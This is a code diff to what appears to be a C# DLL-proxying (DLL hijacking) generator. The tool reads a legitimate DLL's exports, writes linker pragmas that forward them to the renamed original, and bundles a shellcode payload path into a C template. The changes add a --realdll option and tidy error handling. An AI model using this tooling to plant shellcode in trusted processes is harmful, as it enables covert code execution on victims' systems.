@@ -73,7 +73,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
         static void Main(string[] args)
         {
             //Cheesy way to generate a temp filename for our original DLL
-            var tempName = Path.GetFileNameWithoutExtension(Path.GetTempFileName());
+            var realDllName = Path.GetFileNameWithoutExtension(Path.GetTempFileName()) + ".dll";
 
             var orgDllPath = @"";
 
@@ -98,44 +98,49 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
                     }
                 }
 
-		if (args[i].ToLower().Equals("--realdll") || args[i].ToLower().Equals("-realdll"))
-		{
-    			if (i + 1 < args.Length)
-    			{
-        		realDllName = args[i + 1];
-    			}
-		}
+		        if (args[i].ToLower().Equals("--realdll") || args[i].ToLower().Equals("-realdll"))
+		        {
+    			        if (i + 1 < args.Length)
+    			        {
+        		        realDllName = args[i + 1];
+    			        }
+		        }
             }
 
             if (string.IsNullOrWhiteSpace(orgDllPath) || !File.Exists(orgDllPath)) {
                 Console.WriteLine($"[!] Cannot locate DLL path, does it exists?");
-                Environment.Exit(0);
+                return;
             }
 
             if (string.IsNullOrWhiteSpace(payloadPath))
             {
                 Console.WriteLine($"[!] shellcode filname/path is empty, bad input!");
-                Environment.Exit(0);
+                return;
             }
 
-	    
+            
+            
 
 
             //Create an output directory to export stuff too
             string outPath = Directory.CreateDirectory("output_" + Path.GetFileNameWithoutExtension(orgDllPath)).FullName;
 
+            Console.WriteLine(realDllName);
+            Console.WriteLine(orgDllPath);
+            Console.WriteLine(payloadPath);
+
             Console.WriteLine($"[+] Reading exports from {orgDllPath}...");
 
             //Read PeHeaders -> Exported Functions from provided DLL
-            PeNet.PeFile dllPeHeaders = new PeNet.PeFile(orgDllPath);
+            var dllPeHeaders = new PeNet.PeFile(orgDllPath);
 
            //Build up our linker redirects
             foreach (var exportedFunc in dllPeHeaders.ExportedFunctions)
             {
-                pragmaBuilder += $"#pragma comment(linker, \"/export:{exportedFunc.Name}={tempName}.{exportedFunc.Name},@{exportedFunc.Ordinal}\")\n";
+                pragmaBuilder += $"#pragma comment(linker, \"/export:{exportedFunc.Name}={realDllName}.{exportedFunc.Name},@{exportedFunc.Ordinal}\")\n";
 
             }
-            Console.WriteLine($"[+] Redirected {dllPeHeaders.ExportedFunctions.Count()} function calls from { Path.GetFileName(orgDllPath)} to {tempName}.dll");
+            Console.WriteLine($"[+] Redirected {dllPeHeaders.ExportedFunctions.Count()} function calls from { Path.GetFileName(orgDllPath)} to {realDllName}");
 
             //Replace data in our template
             dllTemplate = dllTemplate.Replace("PRAGMA_COMMENTS", pragmaBuilder);
@@ -144,7 +149,7 @@ DWORD WINAPI DoMagic(LPVOID lpParameter)
             Console.WriteLine($"[+] Exporting DLL C source to {outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath)}_pragma.c");
 
             File.WriteAllText($@"{outPath + @"\" + Path.GetFileNameWithoutExtension(orgDllPath)}_pragma.c", dllTemplate);
-            File.WriteAllBytes(outPath + @"\" + tempName + ".dll", File.ReadAllBytes(orgDllPath));
+            File.WriteAllBytes(outPath + @"\" + realDllName, File.ReadAllBytes(orgDllPath));
 
 
         }
